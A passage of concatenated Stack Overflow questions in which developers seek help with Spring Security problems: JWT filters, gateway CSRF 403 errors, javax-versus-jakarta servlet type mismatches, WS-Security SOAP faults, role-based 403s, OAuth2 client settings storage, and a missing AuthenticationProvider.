                // JWT를 사용하기 때문에 세션을 사용하지 않는 설정.(아래)
                .sessionManagement(config -&gt; config.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .formLogin(AbstractHttpConfigurer::disable)  // form 기반 로그인 비활성화
                .httpBasic(AbstractHttpConfigurer::disable)  // rest api이므로 basic auth 및 csrf 보안을 사용하지 않는 설정
                .authorizeHttpRequests(
                        registry -&gt; registry
                                // permitAll()은 권한에만 신경 쓰지 않을 뿐 똑같이 모든 필터를 거침
                                .requestMatchers(HttpMethod.OPTIONS).permitAll()
                                .anyRequest().permitAll()
                )
                // JWT 인증을 위하여 직접 구현한 jwtAuthorizationFilter 필터를 UsernamePasswordAuthenticationFilter 전에 실행
                .addFilterBefore(jwtAuthorizationFilter(), UsernamePasswordAuthenticationFilter.class)
                // exception handler
                .exceptionHandling(handler -&gt; handler.authenticationEntryPoint(entryPoint));
        return http.build();
    }

    @Bean
    public JwtAuthorizationFilter jwtAuthorizationFilter() {
        return new JwtAuthorizationFilter(jwtService);
    }
}

</code></pre>
<p><code>JwtAuthorizationFilter.java</code></p>
<pre class=""lang-java prettyprint-override""><code>package com.cookiee.cookieeserver.login.jwt;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.Claims;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.oauth2.jwt.JwtException;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;

import static com.cookiee.cookieeserver.global.Constant.*;

@RequiredArgsConstructor
@Slf4j
public class JwtAuthorizationFilter extends OncePerRequestFilter {
    private final JwtService jwtService;

    /**
     * doFilter와 같지만 요청 당 한번만 실행되는 것이 보장됨.
     * @param request
     * @param response
     * @param filterChain
     * @throws ServletException
     * @throws IOException
     */
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        log.info(&quot;===doFilterInternal Started===&quot;);

        String servletPath = request.getServletPath();
        log.info(&quot;===request path: {}===&quot;, servletPath);

        // 1. Request Header에서 토큰 추출
        final String headerValue = request.getHeader(HEADER_AUTHORIZATION);

        if (servletPath.contains(&quot;auth&quot;)) {
            log.info(&quot;contains 'auth'&quot;);
            filterChain.doFilter(request, response);
        } else {
            try {
                // 2. 토큰 유효성 검사 (Bearer로 시작하고 값이 있으면)
                if (headerValue != null &amp;&amp; headerValue.startsWith(TOKEN_PREFIX)) {
                    String accessToken = headerValue.substring(TOKEN_PREFIX.length());
                    // 정상 토큰이면 해당 토큰으로 authentication을 가져와 SecurityContext에 저장
                    if (jwtService.validate(accessToken)) {
                        log.info(&quot;[Authorization Filter] Normal JWT&quot;);
                        Authentication authentication = getAuthentication(accessToken);
                        SecurityContextHolder.getContext().setAuthentication(authentication);
                    }
                }
            } catch (JwtException e) {
                log.debug(&quot;===Exception===&quot;);
                request.setAttribute(&quot;exception&quot;, e);
                jwtExceptionHandler(response, e);
            }
            filterChain.doFilter(request, response);
        }
    }

    // 권한 가져오기
    public Authentication getAuthentication(String accessToken) {
        Claims claims = jwtService.getTokenClaims(accessToken);
        Collection&lt;? extends GrantedAuthority&gt; authorities =
                Arrays.stream(new String[]{claims.get(AUTHORITIES_KEY).toString()})
                        .map(SimpleGrantedAuthority::new)
                        .collect(Collectors.toList());
        User principal = new User(claims.getSubject(), &quot;&quot;, authorities);
        log.debug(&quot;=== getting {} authentication ===&quot;, principal);
        return new UsernamePasswordAuthenticationToken(principal, accessToken, authorities);
    }

    // jwt 예외 처리
    public void jwtExceptionHandler(HttpServletResponse response, Throwable error) throws IOException {
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        Map&lt;String, Object&gt; body = new HashMap&lt;&gt;();
        body.put(&quot;message&quot;, error.getMessage());
        body.put(&quot;isSuccess&quot;, false);
        body.put(&quot;code&quot;, HttpServletResponse.SC_UNAUTHORIZED);
        ObjectMapper mapper = new ObjectMapper();
        mapper.writeValue(response.getOutputStream(), body);
        response.setStatus(HttpServletResponse.SC_OK);
    }
}

</code></pre>
<p><code>OAuthController.java</code></p>
<pre class=""lang-java prettyprint-override""><code>package com.cookiee.cookieeserver.login;

import com.cookiee.cookieeserver.global.StatusCode;
import com.cookiee.cookieeserver.global.dto.BaseResponseDto;
import com.cookiee.cookieeserver.global.dto.DataResponseDto;
import com.cookiee.cookieeserver.global.dto.ErrorResponseDto;
import com.cookiee.cookieeserver.login.dto.request.UserSignupRequestDto;
import com.cookiee.cookieeserver.login.dto.response.AccessTokenResponse;
import com.cookiee.cookieeserver.login.jwt.JwtHeaderUtil;
import com.cookiee.cookieeserver.login.jwt.JwtService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.PostMapping;

@Controller
@Slf4j
@RequiredArgsConstructor
public class OAuthController {
    private final JwtService jwtService;
    private final OAuthService oAuthService;

    /**
     * 새로 가입한 사용자가 소셜 로그인 후 회원 정보 입력할 때
     * @return
     */
    @PostMapping(value = &quot;/auth/signup&quot;, consumes = {MediaType.MULTIPART_FORM_DATA_VALUE})
    public BaseResponseDto&lt;?&gt; signup(UserSignupRequestDto userSignupRequestDto) {
        try{
            OAuthResponse response = oAuthService.signup(userSignupRequestDto);
            log.info(&quot;[OAuthController] response: {}&quot;, response);
            return DataResponseDto.of(response);
        }
        catch(Exception e){
            log.debug(e.getMessage());
            return ErrorResponseDto.of(StatusCode.INTERNAL_ERROR, e.getMessage());
        }
    }

    /**
     * 회원 탈퇴
     * @return
     */
    @DeleteMapping(&quot;/auth/signout&quot;)
    public BaseResponseDto&lt;?&gt; signout() throws Exception {
        String accessToken = JwtHeaderUtil.getAccessToken();
        Long userId = jwtService.getUserId(accessToken);

        oAuthService.signout(userId);
        return DataResponseDto.of(null, &quot;회원 탈퇴에 성공하였습니다.&quot;);
    }

    /**
     * 액세스 토큰 갱신
     * @return
     * @throws Exception
     */
    @PostMapping(&quot;/auth/refresh&quot;)
    public BaseResponseDto&lt;?&gt; refresh() {
        try {
            AccessTokenResponse response = jwtService.reissueAccessToken();
            return DataResponseDto.of(response);
        }
        catch (Exception e){
            return ErrorResponseDto.of(StatusCode.VALIDATION_ERROR, e.getMessage());
        }
    }

    /**
     * 로그아웃
     */
//    @PutMapping(&quot;/logout&quot;)
//    public BaseResponseDto&lt;?&gt; logout() {
//
//    }
}
</code></pre>
<p><code>UserSignupRequestDto</code> has <code>MultipartFile</code> field.</p>
<p>FYI, my project is only using social login(google and apple).</p>
<p>I need help so bad😭</p>
"
"<p>I am trying to configure spring gateway using spring boot 3 version, java 17 version, and kotlin language.
However, it seems that the spring security settings are not applied.</p>
<p>as postman</p>
<p>POST
If I call it with <a href=""http://127.0.0.1:11001"" rel=""nofollow noreferrer"">http://127.0.0.1:11001</a> I get a 403 Forbidden error and An expected CSRF token cannot be found
The result is</p>
<p>Regarding this, I already created a SecurityConfig class and set it as below, but it doesn't work.</p>
<p>The github address used for this configuration is as follows:
<a href=""https://github.com/arubear1321/studyspringgateway.git"" rel=""nofollow noreferrer"">https://github.com/arubear1321/studyspringgateway.git</a></p>
<p>If I configure it with the same java version, it works fine.
I don't think there's anything special to set, so why doesn't it work?</p>
<hr />
<p>SecurityConfig.kt</p>
<pre><code>import org.slf4j.LoggerFactory
import org.springframework.context.annotation.Bean
import org.springframework.context.annotation.Configuration
import org.springframework.security.config.annotation.method.configuration.EnableReactiveMethodSecurity
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity
import org.springframework.security.config.web.server.ServerHttpSecurity
import org.springframework.security.web.server.SecurityWebFilterChain


@Configuration
@EnableWebFluxSecurity
@EnableReactiveMethodSecurity
class SecurityConfig {
    private val logger = LoggerFactory.getLogger(SecurityConfig::class.java)

    @Bean
    fun securityWebFilterChain(http: ServerHttpSecurity): SecurityWebFilterChain {
        logger.info(&quot;Configuring SecurityWebFilterChain&quot;)

        http
            .csrf { it.disable() }
            .authorizeExchange {
                it.anyExchange().permitAll()
            }
            .formLogin{ it.disable() }
            .httpBasic{ it.disable() }

        return http.build()

    }
}
</code></pre>
<p>application.yml</p>
<pre><code>server:
  port: 11001
  shutdown: graceful

spring:
  application:
    name: api-gateway
  lifecycle:
    timeout-per-shutdown-phase: 60s
  cloud:
    gateway:
      default-filters:
        - DedupeResponseHeader=Access-Control-Allow-Credentials Access-Control-Allow-Origin
      globalcors:
        corsConfigurations:
          '[/**]':
            allowedOrigins: &quot;*&quot;
            allowedHeaders: &quot;*&quot;
            allowedMethods:
              - GET
              - POST
              - OPTION
              - PUT
      routes:
        - id: api
          uri: http://127.0.0.1:11002
          predicates:
            - Path=/api/**

logging:
  level:
    root: TRACE
    org.springframework.security: TRACE



</code></pre>
"
"<pre class=""lang-java prettyprint-override""><code>@Override
protected void configure(HttpSecurity http) throws Exception {
    http
        .csrf()
        .disable()
        .authorizeHttpRequests()
        .antMatchers(PUBLIC_URLS).permitAll()
        .antMatchers(HttpMethod.GET).permitAll()
        .anyRequest()
        .authenticated()
        .and()
        .exceptionHandling()
        .authenticationEntryPoint(this.jwtAuthenticationEntryPoint)
        .and()
        .sessionManagement()
        .sessionCreationPolicy(SessionCreationPolicy.STATELESS);

    http.addFilterBefore((Filter) this.jwtAuthenticationFilter, (Class&lt;? extends Filter&gt;) UsernamePasswordAuthenticationFilter.class);
}

public class JwtAuthenticationFilter extends OncePerRequestFilter {...}
</code></pre>
<p>What should I do?</p>
<pre class=""lang-java prettyprint-override""><code>addFilterBefore(javax.servlet.Filter, java.lang.Class&lt;? extends javax.servlet.Filter&gt;)'
  in 'org.springframework.security.config.annotation.web.builders.HttpSecurity'
  cannot be applied to '(com.note.security.JwtAuthenticationFilter, java.lang.Class&lt;org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter&gt;)
</code></pre>
<p>Before solving this error I found one more error:</p>
<pre><code>java: incompatible types:
java.lang.Class&lt;org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter&gt;
cannot be converted to java.lang.Class&lt;? extends javax.servlet.Filter&gt;
</code></pre>
<p>Here is my <code>pom.xml</code> file :</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.note&lt;/groupId&gt;
    &lt;artifactId&gt;Notes_Management&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;Notes_Management&lt;/name&gt;
    &lt;description&gt;A system for sharing Notes&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.mysql&lt;/groupId&gt;
            &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.modelmapper&lt;/groupId&gt;
            &lt;artifactId&gt;modelmapper&lt;/artifactId&gt;
            &lt;version&gt;3.1.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;!-- https://mvnrepository.com/artifact/org.springframework.security/spring-security-config --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-config&lt;/artifactId&gt;
            &lt;version&gt;5.7.11&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- https://mvnrepository.com/artifact/io.jsonwebtoken/jjwt --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;
            &lt;artifactId&gt;jjwt&lt;/artifactId&gt;
            &lt;version&gt;0.9.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-servlet-api --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
            &lt;artifactId&gt;tomcat-servlet-api&lt;/artifactId&gt;
            &lt;version&gt;10.1.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
            &lt;version&gt;4.0.1&lt;/version&gt;
            &lt;scope&gt;provided&lt;/scope&gt;
        &lt;/dependency&gt;

        &lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-boot-starter --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.springfox&lt;/groupId&gt;
            &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt;
            &lt;version&gt;3.0.0&lt;/version&gt;
        &lt;/dependency&gt;

    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;
&lt;/project&gt;
</code></pre>
"
"<p>I have a client to a SOAP service I do not control (implemented in .NET). The service provides a WSDL. I use JAX-WS's toolset to generate the java client from the WSDL (specifically, the jaxws-maven-plugin for Maven, which uses wsimport under the hood).</p>
<p>The response below is received.</p>
<p>2024-03-02 16:59:21.141 ERROR 20616 --- [nio-9091-exec-3] c.e.n.client.controller.RestController   : org.springframework.ws.soap.client.SoapFaultClientException: The security context token is expired or is not valid. The message was not processed.
at org.springframework.ws.soap.client.core.SoapFaultMessageResolver.resolveFault(SoapFaultMessageResolver.java:38)
at org.springframework.ws.client.core.WebServiceTemplate.handleFault(WebServiceTemplate.java:787)
at org.springframework.ws.client.core.WebServiceTemplate.doSendAndReceive(WebServiceTemplate.java:601)
at org.springframework.ws.client.core.WebServiceTemplate.sendAndReceive(WebServiceTemplate.java:538)
at org.springframework.ws.client.core.WebServiceTemplate.marshalSendAndReceive(WebServiceTemplate.java:390)
at org.springframework.ws.client.core.WebServiceTemplate.marshalSendAndReceive(WebServiceTemplate.java:384)
at org.springframework.ws.client.core.WebServiceTemplate.marshalSendAndReceive(WebServiceTemplate.java:374)</p>
<p>i have setup an interceptor (code below), ensured that the keystore has the certificates from service provide and a self-signed certificate from dev environments.</p>
<pre><code>@Autowired
    public WebServiceSecurityInterceptor(
            KeyStoreCallbackHandler securityCallbackHandler,
            CryptoFactoryBean cryptoFactory
    ) throws Exception {
        super();

        setValidationActions(
                WSHandlerConstants.TIMESTAMP
                        + &quot; &quot;
                        + WSHandlerConstants.SIGNATURE
                        + &quot; &quot; + WSHandlerConstants.ENCRYPT);
        setValidationSignatureCrypto(cryptoFactory.getObject());
        setValidationDecryptionCrypto(cryptoFactory.getObject());
        setValidationCallbackHandler(securityCallbackHandler);

        // set security actions
        setSecurementActions(
                WSHandlerConstants.TIMESTAMP + &quot; &quot; +
                        WSHandlerConstants.SIGNATURE + &quot; &quot; +
                        WSHandlerConstants.ENCRYPT);

        // sign the request
        setSecurementUsername(SIGNING_USERNAME);
        setSecurementPassword(PASSWORD);
        setSecurementSignatureCrypto(cryptoFactory.getObject());
        setSecurementSignatureAlgorithm(WSS4JConstants.RSA);

        // encrypt the request
        setSecurementEncryptionUser(ENCRYPTION_USER);
        setSecurementEncryptionCrypto(cryptoFactory.getObject());
        setSecurementEncryptionParts(&quot;{Content}{}Body&quot;);
        setSecurementSignatureKeyIdentifier(&quot;IssuerSerial&quot;);
        setSecurementEncryptionKeyTransportAlgorithm(WSS4JConstants.KEYTRANSPORT_RSA15);
        setSecurementEncryptionSymAlgorithm(WSS4JConstants.TRIPLE_DES);
    }
</code></pre>
"
"<p>@Service</p>
<pre><code> @Override
    public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {

        User user = userRepository.findByEmail(email).orElse(null);

        LOGGER.info(user.getEmail());
        if (user == null) {
            throw new UsernameNotFoundException(&quot;User not found with email: &quot; + email);
        }

        Set&lt;GrantedAuthority&gt; authorities = user.getRoles().stream()
                .map(role -&gt; new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.getRoleName()))
                .collect(Collectors.toSet());

        return new org.springframework.security.core.userdetails.User(user.getEmail(), user.getPassword(), authorities);
    }

    public Authentication authenticateUser(String email, String password) {
        UserDetails userDetails = loadUserByUsername(email);
        UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(userDetails, password, userDetails.getAuthorities());
        return authenticationToken;

    }


@Override
    public void saveUser(UserDTO userDTO) {
        User user = new User(userDTO.getUsername(), userDTO.getUserLastname(), userDTO.getEmail(), userDTO.getPassword());
        user.setId(UUID.randomUUID().toString());
        List&lt;Role&gt; roles = new ArrayList&lt;Role&gt;();
        Role role = new Role();
        role.setRoleName(&quot;USER&quot;);
        roles.add(role);
        user.setRoles(roles);

        user.setPassword(passwordEncoder.encode(userDTO.getPassword()));
        user.getRoles().forEach(myRole -&gt; LOGGER.info(myRole.getRoleName() + &quot; : here&quot;));
        userRepository.save(user);
    }
   @Bean
    protected SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -&gt; csrf.disable())
               .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .authorizeHttpRequests(auth -&gt; auth
                .requestMatchers(&quot;/dashboard/**&quot;).hasRole(&quot;USER&quot;)
                .requestMatchers(&quot;/&quot;, &quot;/login/&quot;).permitAll()
                .anyRequest().authenticated());

        return http.build();
    }
</code></pre>
<p>I create user as a &quot;USER&quot; then only could reach who has &quot;USER&quot; user I mean &quot;GUEST&quot; do not see because those private content for user basicly and I receive HTTP &quot;403&quot; Forbidden error. I could not figure out authentication access. What am I missing</p>
<p>I collected needed parts under service component only asking question, each method has been placed  at own class</p>
<p>solution of this problem</p>
"
"<p>I'm using Spring OAuth2's Authorization Server and want to store OAuth2 registered client information in a database using the schema provided by <code>JdbcRegisteredClientRepository</code>. My goal is to store the <code>client_settings</code> and <code>token_settings</code> columns directly as JSON.</p>
<p>When I originally attempted to store the value directly as a JSON string and enabled trace logs, the application failed without providing sufficient error information.</p>
<p>Later, I used the standard <code>JdbcRegisteredClientRepository.save()</code> method, values get stored with an additional <code>@class</code> definition:</p>
<pre><code>'{&quot;@class&quot;:&quot;java.util.Collections$UnmodifiableMap&quot;,&quot;settings.client.require-proof-key&quot;:false,&quot;settings.client.require-authorization-consent&quot;:true}'
</code></pre>
<p>This format seems to be generated by the <code>parseMap</code> function within <code>JdbcRegisteredClientRepository</code>.</p>
<p><strong>Code Snippet (for reference):</strong></p>
<pre class=""lang-java prettyprint-override""><code>Map&lt;String, Object&gt; clientSettingsMap = parseMap(rs.getString(&quot;client_settings&quot;));

private Map&lt;String, Object&gt; parseMap(String data) {
    try {
       return this.objectMapper.readValue(data, new TypeReference&lt;Map&lt;String, Object&gt;&gt;() {});
    } catch (Exception ex) {
       throw new IllegalArgumentException(ex.getMessage(), ex);
    }
}
</code></pre>
<p><strong>Question:</strong></p>
<p>How can I customize the <code>JdbcRegisteredClientRepository</code> (or provide an alternative mechanism) to store <code>client_settings</code> and <code>token_settings</code> as plain JSON within the standard <code>oauth2_registered_client</code> table schema?</p>
<p><strong>Desired Outcome:</strong></p>
<p>I'd like to avoid the additional <code>@class</code> overhead and store my client settings as simple JSON.</p>
<p>Thank you for any suggestions!</p>
"
"<p>While using spring security, I have encountered a weird issue that I am not able to wrap my head around.<br />
If I declare a custom authentication provider with the <code>@Component</code> annotation, Spring is no longer able to detect the authentication provider for <code>BasicAuthenticationFilter</code>. I am passing both the basic auth and the key for my custom filter in the headers using postman. This is the exception/error:</p>
<pre><code>2024-02-26T01:56:59.981+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=Mvc [pattern='/public/**'], Filters=[]] (1/2)
2024-02-26T01:56:59.981+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=any request, Filters=[org.springframework.security.web.session.DisableEncodeUrlFilter@409df37d, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@2ab1c7a9, org.springframework.security.web.context.SecurityContextHolderFilter@22c14d10, org.springframework.security.web.header.HeaderWriterFilter@e594c46, org.springframework.security.web.csrf.CsrfFilter@27b7913, org.springframework.security.web.authentication.logout.LogoutFilter@411e567e, com.prajwal.security.config.filter.CustomFilter@7cfb4736, org.springframework.security.web.authentication.www.BasicAuthenticationFilter@5257123d, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@38276668, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@3344c1d7, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6e818345, org.springframework.security.web.access.ExceptionTranslationFilter@5dd5422f, org.springframework.security.web.access.intercept.AuthorizationFilter@339b45f8]] (2/2)
2024-02-26T01:56:59.981+05:30 DEBUG 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Securing GET /private/hello
2024-02-26T01:56:59.981+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking DisableEncodeUrlFilter (1/13)
2024-02-26T01:56:59.981+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking WebAsyncManagerIntegrationFilter (2/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking SecurityContextHolderFilter (3/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking HeaderWriterFilter (4/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking CsrfFilter (5/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.csrf.CsrfFilter         : Did not protect against CSRF since request did not match CsrfNotRequired [TRACE, HEAD, GET, OPTIONS]
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking LogoutFilter (6/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.s.w.a.logout.LogoutFilter            : Did not match request to Ant [pattern='/logout', POST]
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking CustomFilter (7/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.security.web.FilterChainProxy        : Invoking BasicAuthenticationFilter (8/13)
2024-02-26T01:56:59.982+05:30 TRACE 4304 --- [nio-8080-exec-4] o.s.s.w.a.www.BasicAuthenticationFilter  : Found username 'prajwal' in Basic Authorization header
2024-02-26T01:56:59.982+05:30 DEBUG 4304 --- [nio-8080-exec-4] o.s.s.w.a.www.BasicAuthenticationFilter  : Failed to process authentication request

org.springframework.security.authentication.ProviderNotFoundException: No AuthenticationProvider found for org.springframework.security.authentication.UsernamePasswordAuthenticationToken
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:234) ~[spring-security-core-6.1.5.jar:6.1.5]
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:174) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at com.prajwal.security.config.filter.CustomFilter.doFilterInternal(CustomFilter.java:34) ~[classes/:na]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.csrf.CsrfFilter.doFilterInternal(CsrfFilter.java:117) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
